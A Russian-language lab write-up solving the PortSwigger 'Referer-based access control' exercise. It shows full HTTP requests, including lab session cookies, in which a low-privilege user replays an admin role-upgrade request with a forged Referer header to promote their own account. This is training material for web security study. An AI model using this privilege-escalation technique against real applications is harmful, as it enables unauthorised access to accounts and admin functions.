---
title: "Referer-based access control"
date: 2025-07-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-referer-based-access-control"
classes: wide
---

У нас есть данные для входа в учетную запись администратора `administrator`:`admin` и в нашу `wiener`:`peter`.

Для прохождения лабы нужно повысить права нашего аккаунта через **уязвимость контроля доступа через Referer**.

```
https://0a5e006703ed1e9880425d3c005b0030.web-security-academy.net/
```

## Solution

Зайду в ЛК админа. Зайду в панель админа и повышу пользователя `carlos`, чтобы собрать запросы:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Referer-based_access_control/1.png){: height="200" .align-center}

Запрос:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a5e006703ed1e9880425d3c005b0030.web-security-academy.net
Cookie: session=vu0K5L2D8wqkJO7XF1Cs8V0v69YtIvPv
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5e006703ed1e9880425d3c005b0030.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

Закину его в `Repeater`. Иду в аккаунт `wiener`. Возьму новое значение `Cookies`, чтобы отправлять запрос от лица непривилегированного пользователя:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a5e006703ed1e9880425d3c005b0030.web-security-academy.net
Cookie: session=OMEHhZhAsIgyAXcqFzGuShFq239HqLgI
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5e006703ed1e9880425d3c005b0030.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Получилось... Слишком просто.

Глянул разбор. Идея был в том, чтобы взять именно `URL` `/admin-roles?username=carlos&action=upgrade`, а дальше уже подставить значение `Referer`, которое используется для зашиты доступа к `API`-ручкам админа. Но я скопировал запрос, поэтому у меня это поле уже было) Таков путь...


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Referer-based_access_control/2.png){: height="200" .align-center}